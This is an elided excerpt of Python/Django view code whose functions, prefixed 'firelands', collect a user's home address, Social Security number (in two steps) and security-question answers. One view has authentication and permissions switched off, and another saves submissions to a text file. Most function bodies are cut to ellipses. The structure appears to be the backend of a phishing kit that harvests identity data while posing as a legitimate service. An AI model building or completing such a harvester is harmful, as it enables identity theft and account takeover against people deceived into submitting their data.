...
def firelands_collect_user_home_address(request):
    ...
    if request.method == "POST":
        try:
            ...
            logger.exception("firelands_collect_user_home_address failed")
            payload["message"] = "Errors"
            payload["errors"] = {"detail": ["Internal server error"]}
            return Response(payload, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
    return Response(payload)
...
@permission_classes([])
@authentication_classes([])
def firelands_collect_user_social_security(request):
    ...
    if request.method == "POST":
        try:
            ...
            logger.exception("firelands_collect_user_social_security failed")
            payload["message"] = "Errors"
            payload["errors"] = {"detail": ["Internal server error"]}
            return Response(payload, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
    return Response(payload)
...
def firelands_collect_user_social_security_2(request):
    ...
    if request.method == "POST":
        try:
            ...
            logger.exception("firelands_collect_user_social_security_2 failed")
            payload["message"] = "Errors"
            payload["errors"] = {"detail": ["Internal server error"]}
            return Response(payload, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
    return Response(payload)
...
def firelands_collect_user_security_questions(request):
    ...
    if request.method == "POST":
        ...
        # Save to txt
        ##############################
        firelands_save_data_to_file(username, message)
...
def firelands_is_valid_email(email):
...
def firelands_save_data_to_file(email, message):
